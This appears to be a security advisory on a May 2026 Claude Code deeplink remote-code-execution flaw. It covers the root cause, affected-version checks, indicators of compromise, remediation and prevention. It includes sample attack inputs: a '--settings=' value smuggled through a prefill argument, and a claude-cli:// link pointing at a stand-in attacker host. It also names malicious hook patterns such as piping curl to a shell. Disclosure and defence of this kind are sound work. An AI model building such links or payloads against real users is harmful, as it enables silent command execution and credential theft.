---
id: 2026-05-claude-code-deeplink-rce
title: "Claude Code claude-cli:// deeplink RCE (May 2026)"
date_disclosed: 2026-05-12
last_updated: 2026-05-19
severity: critical
status: patched
ecosystems: [claude-code]
tools_affected: [claude-code]
tags: [rce, deeplink, settings-injection, cli-parser, eager-parse]
---

## TL;DR
Anthropic's Claude Code CLI shipped a naive command-line argument parser (`eagerParseCliFlag` in `main.tsx`) that scanned the whole argv for any string beginning with `--settings=`, without tracking whether the string was a flag or another flag's *value*. Combined with the `claude-cli://` deeplink handler's `q=` (prefill prompt) parameter, this let a single attacker URL inject an attacker-controlled `--settings` payload — including arbitrary shell hooks — that ran before normal initialization. Patched in **Claude Code 2.1.118**. Update now; the deeplink handler is registered automatically on install.

## What happened
On 2026-05-12, security researcher **Joernchen (0day.click)** publicly disclosed a critical RCE in Claude Code that they had identified during a manual audit of the CLI's source code (a path materially easier after the [2026-03 source-map leak](2026-03-claude-code-source-map-leak.md) put the entire internal TypeScript in front of researchers).

The root cause was in `eagerParseCliFlag()`, a function in `main.tsx` designed to read critical flags like `--settings` *before* the main argument parser ran. Its implementation walked the entire `process.argv` and treated any element starting with `--settings=` as the active settings flag — regardless of whether the previous argv element was a flag that *consumed the value*. For example:

```
claude --prefill "--settings=/tmp/evil.json"
```

would cause `eagerParseCliFlag` to "see" `--settings=/tmp/evil.json` and apply that settings file, even though the real `--settings` flag was never provided.

The exploit chain combined this with Claude Code's `claude-cli://` URL scheme (auto-registered on install). When a victim clicks a link like:

```
claude-cli://prompt?q=--settings=https%3A//attacker.example/cfg.json
```

the OS launches the registered handler, which passes `q=` to `claude --prefill <value>`. The settings file controls hook commands (`onSessionStart` etc.) — those are shell commands, and they run *with the user's shell on the next session*.

A successful click on a malicious link (HTML email, chat message, README, Slack preview, etc.) is a **silent local RCE** as the user. No prompt approval, no permission flow — the settings hook fires before any agent loop.

## Am I affected?

```bash
# Check Claude Code version
claude --version
# Fix is in 2.1.118

# Confirm the deeplink handler is registered (macOS)
defaults read -g | grep -i claude-cli

# Confirm the deeplink handler is registered (Linux desktops)
xdg-mime query default x-scheme-handler/claude-cli 2>/dev/null

# If the version is < 2.1.118 AND you ever clicked an external claude-cli:// link
# in the relevant window, audit ~/.claude/ for unexpected hook commands.
cat ~/.claude/settings.json 2>/dev/null | jq '.hooks // .onSessionStart // empty'
```

If the version is below 2.1.118 you are vulnerable to anyone who can deliver a clickable URL.

### IOCs

| Type | Value |
|---|---|
| Fixed version | `claude-code 2.1.118` |
| Vulnerable function | `eagerParseCliFlag()` in `main.tsx` |
| Deeplink scheme | `claude-cli://` |
| Exploitable parameter | `q=` (prompt prefill) |
| Payload shape | `--settings=<URL or path>` smuggled as a `q=` value |
| Researcher | Joernchen / 0day.click |

No specific in-the-wild URLs have been published as IOCs. Treat any unfamiliar `claude-cli://` link as hostile.

## If you are affected
1. Upgrade: `claude-code update` or reinstall — confirm `claude --version` reports **≥ 2.1.118**.
2. Inspect `~/.claude/settings.json` (and any `--settings` paths referenced from your shell rc) for unfamiliar hook commands. Anything that runs `curl … | sh`, writes to `~/.ssh/`, or sets up a reverse shell is malicious.
3. If you find a suspicious hook, follow [playbooks/if-your-npm-token-leaked.md](../playbooks/if-your-npm-token-leaked.md) and [playbooks/if-your-github-pat-leaked.md](../playbooks/if-your-github-pat-leaked.md) — assume token theft, rotate everything Claude Code had access to (npm, GitHub, cloud, LLM keys).
4. Browser history audit: search for any `claude-cli://` URLs you may have clicked.

## Prevention
→ [prevention/agent-sandboxing.md](../prevention/agent-sandboxing.md)
→ Default-deny URL schemes: if you don't need `claude-cli://` deeplinks, unregister the scheme handler at the OS level.
→ Treat any IDE/agent CLI argv parser as a security boundary, not a UX nicety — the [InversePrompt cluster](2025-08-claude-code-inverseprompt.md) and this CVE share a class: "string smuggled into a flag context."

## Sources
- [0day.click — Claude Code RCE: Exploiting Deeplink Handlers via Settings Injection](https://0day.click/recipe/2026-05-12-cc-rce/) — Original researcher writeup (Joernchen).
- [Cybersecurity News — Claude Code RCE Flaw Lets Attackers Execute Commands via Malicious Deeplinks](https://cybersecuritynews.com/claude-code-rce-flaw/) — Patch version (2.1.118) and root-cause description.
- [Cyberpress — Claude Code RCE Vulnerability Allow Attackers Execute Commands via Malicious Deeplinks](https://cyberpress.org/claude-code-rce-vulnerability/) — Independent confirmation, exploitation walkthrough.
- [GBHackers — Claude Code Vulnerability Allows Attackers to Run Commands Through Crafted Deeplinks](https://gbhackers.com/claude-code-vulnerability/) — Exploit-chain summary.
- [InfoSecBulletin — Claude Code RCE Vulnerability Allows Attackers Execute Commands via Deeplinks](https://infosecbulletin.com/claude-code-rce-vulnerability-allows-attackers-execute-commands-via-deeplinks/) — Aggregator confirmation.
- [CyberWebSpider — Critical RCE Flaw in Claude Code Patched by Anthropic](https://cyberwebspider.com/cyber-security-news/critical-rce-flaw-claude-code/) — Aggregator confirmation.
